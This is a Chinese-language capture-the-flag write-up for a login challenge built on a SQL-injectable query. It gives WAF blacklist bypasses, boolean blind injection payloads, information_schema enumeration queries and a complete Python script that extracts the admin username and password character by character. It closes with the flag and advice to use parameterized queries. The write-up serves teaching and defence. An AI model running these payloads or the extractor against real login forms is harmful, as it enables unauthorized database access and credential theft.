# Login To Get My Gift

## 题目简述

登录接口把用户名和密码直接格式化进 SQL：

```sql
select * from User1nf0mAt1on
where UsErN4me = '%s' and PAssw0rD = '%s'
```

服务设置了关键词黑名单，但仍可通过布尔盲注逐字符恢复数据库名、表名、列名以及管理员账号密码，最后正常登录取得 flag。

## 解题过程

黑名单包括：

```text
union, 空格, and, substr, =, mid, !, extract, update, like
```

绕过方式如下：

- 用 `/**/` 代替空格；
- 用 `or` 构造真假分支；
- 用 `right(left(value, position), 1)` 代替 `substr`；
- 用 `>` 做二分比较，避免 `=`；
- 用十六进制表示数据库名和表名；
- 用 `#` 注释原查询末尾的单引号。

例如判断数据库名第一个字符的 ASCII 值是否大于某个数：

```text
username: 111
password: 1'/**/or/**/ascii(right(left(database(),1),1))>79#
```

依次枚举元数据时使用以下表达式：

```sql
database()

select group_concat(table_name)
from information_schema.tables
where table_schema in (0x4c3067314e4d65)

select group_concat(column_name)
from information_schema.columns
where table_name in (0x55736572316e66306d4174316f6e)

select UsErN4me from User1nf0mAt1on limit 1
select PAssw0rD from User1nf0mAt1on limit 1
```

其中两个十六进制常量分别表示已注出的数据库名和表名。下面的提取器对任意表达式逐字符二分；响应包含 `Success!` 表示比较为真：

```python
import time
import requests

URL = "http://challenge.example/login"


def extract(expression: str) -> str:
    result = []
    for position in range(1, 129):
        low, high = 32, 127
        while low < high:
            middle = (low + high) // 2
            payload = (
                "1'/**/or/**/ascii(right(left(("
                + expression
                + f"),{position}),1))>{middle}#"
            )
            response = requests.post(
                URL,
                data={"username": "111", "password": payload},
                timeout=5,
            )
            if "Success!" in response.text:
                low = middle + 1
            else:
                high = middle
            time.sleep(0.1)

        if low == 32:
            break
        result.append(chr(low))
        print("".join(result))
    return "".join(result)


admin = extract("select/**/UsErN4me/**/from/**/User1nf0mAt1on/**/limit/**/1")
password = extract("select/**/PAssw0rD/**/from/**/User1nf0mAt1on/**/limit/**/1")
print(admin, password)
```

若注出的凭据含大小写字符，而现有自动化工具默认使用不区分大小写的正则比较，需要启用二进制比较，避免大小写被合并。使用恢复出的管理员账号和密码登录后得到：

```text
hgame{It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on}
```

## 方法总结

关键词黑名单无法可靠阻止 SQL 注入：注释、等价函数、比较运算和十六进制常量都能改变表面文本而保留语义。正确修复是使用参数化查询，并为数据库账号配置最小权限；WAF 只能作为辅助检测，不能替代安全的数据访问接口。
